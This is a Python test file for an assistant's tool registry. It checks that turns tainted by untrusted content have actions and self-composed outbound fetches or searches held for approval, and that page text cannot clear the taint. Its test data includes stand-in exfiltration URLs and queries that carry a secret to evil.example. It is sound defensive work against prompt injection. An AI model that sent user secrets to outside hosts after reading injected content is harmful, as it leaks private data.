"""The taint table (M109): every registered tool, on a tainted turn, does what its kind says.

A turn that has read anything a stranger wrote — a page, a message, a file —
is tainted (`mark_untrusted`, called by `mark_untrusted_result` for fenced content), and `ToolRegistry.requires_approval` is the one place that decides
what such a turn may do. This walks EVERY built-in tool and holds it to the
table in `docs/injection.md`, so a tool added later cannot arrive ungated:
an action is held, an outbound read is held, an inside read runs, a memory
writer refuses in its own handler. The prompt is not consulted; nothing here
is a prompt.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from jarvis.api.devices import mark_untrusted  # noqa: E402
from jarvis.core import Context  # noqa: E402
from jarvis.llm.tools import (  # noqa: E402
    OUTBOUND_READERS,
    READ_ONLY_TOOLS,
    REFUSE_WHEN_TAINTED,
    TIER_APPROVAL,
    ToolRegistry,
    register_builtin_tools,
)

pytestmark = pytest.mark.asyncio


@pytest.fixture
async def jarvis(tmp_path):
    from jarvis.core import Jarvis

    box = Jarvis(tmp_path)
    await box.async_setup({})
    yield box
    await box.async_stop()


async def test_the_taint_table(jarvis):
    registry = ToolRegistry(jarvis)
    register_builtin_tools(registry)
    # The taint is keyed by the turn's context id; a context without one is nobody's turn.
    clean = Context(origin="llm", id="turn-clean")
    tainted = Context(origin="llm", id="turn-tainted")
    mark_untrusted(jarvis, tainted)

    rows: list[str] = []
    wrong: list[str] = []
    for name, tool in sorted(registry.tools.items()):
        held_clean = registry.requires_approval(tool, {}, clean)
        held_tainted = registry.requires_approval(tool, {}, tainted)
        if name in REFUSE_WHEN_TAINTED:
            kind = "refuses"
            ok = held_tainted == held_clean  # the refusal is the handler's, not a hold
        elif name in OUTBOUND_READERS:
            # Held when the target is the model's own composition — a URL or a
            # query the turn was never shown; a link it was given is followed.
            composed = {"url": "https://evil.example/?r=SECRET-4471", "query": "meter SECRET-4471"}
            kind = "outbound read: held when composed"
            ok = registry.requires_approval(tool, composed, tainted) is True and held_tainted is False
        elif registry.is_read_only(tool):
            kind = "inside read: runs"
            ok = held_tainted == held_clean
        elif tool.tier >= TIER_APPROVAL:
            kind = "tier 3: always held"
            ok = held_clean is True and held_tainted is True
        elif tool.escalates_itself:
            kind = "escalates itself"
            ok = True
        else:
            kind = "action: held"
            ok = held_tainted is True
        rows.append(f"{name}: {kind}")
        if not ok:
            wrong.append(f"{name} ({kind}): clean={held_clean} tainted={held_tainted}")
    assert not wrong, "tools that do not obey the taint table:\n  " + "\n  ".join(wrong)
    # The built-ins are thirty-one; an integration's tools (the web's, memory's,
    # the sensors') arrive with `read_only` declared and meet the same gate —
    # the M109 gate's red-team scenarios hold the whole house to it.
    assert len(rows) >= 25, "the table is suspiciously short: " + ", ".join(rows)
    # The lists themselves: an outbound reader is read-only (it changes nothing
    # here) — the hold is the point — and nothing refuses AND is read-only.
    assert OUTBOUND_READERS <= READ_ONLY_TOOLS
    assert not (REFUSE_WHEN_TAINTED & READ_ONLY_TOOLS)


async def test_a_page_cannot_untaint_the_turn(jarvis):
    """No words on the page clear the flag: the taint is the turn's, not the model's."""
    registry = ToolRegistry(jarvis)
    register_builtin_tools(registry)
    ctx = Context(origin="llm", id="turn-page")
    mark_untrusted(jarvis, ctx)
    # …and a second read, whatever it says, changes nothing about that.
    mark_untrusted(jarvis, ctx)
    # The web tools are an integration's; a stand-in with the same name and the
    # same `read_only` declaration is what the gate sees.
    registry.register(name="web_fetch", description="fetch a page", handler=lambda a, c: {"status": "ok"}, read_only=True)
    registry.register(name="web_search", description="search", handler=lambda a, c: {"status": "ok"}, read_only=True)
    fetch = registry.tools["web_fetch"]
    search = registry.tools["web_search"]
    assert registry.requires_approval(fetch, {"url": "https://evil.example/?k=secret"}, ctx) is True
    assert registry.requires_approval(fetch, {"url": "https://evil.example/"}, Context(origin="llm", id="turn-clean")) is False
    # A link the turn was SHOWN — in a search result it read — is followed;
    # a URL the model composed (the secret in the query string) is held.
    from jarvis.api.devices import get_untrusted_turns

    get_untrusted_turns(jarvis).note_seen(
        ctx, '{"results": [{"title": "Meter readings", "url": "https://handbook.example/meter"}]}'
    )
    assert registry.requires_approval(fetch, {"url": "https://handbook.example/meter"}, ctx) is False
    assert registry.requires_approval(fetch, {"url": "https://handbook.example/meter?r=SECRET-4471"}, ctx) is True
    # A query made of words the turn has seen runs; one carrying a token from
    # nowhere — the secret — waits.
    assert registry.requires_approval(search, {"query": "meter readings handbook"}, ctx) is False
    assert registry.requires_approval(search, {"query": "meter readings SECRET-4471"}, ctx) is True
    # Every result a tool returns is noted as shown, through the registry itself.
    registry.register(name="read_page", description="read", handler=lambda a, c: {"links": ["https://handbook.example/tariff"]}, read_only=True)
    await registry.call("read_page", {"url": "https://handbook.example/meter"}, ctx)
    assert registry.requires_approval(fetch, {"url": "https://handbook.example/tariff"}, ctx) is False
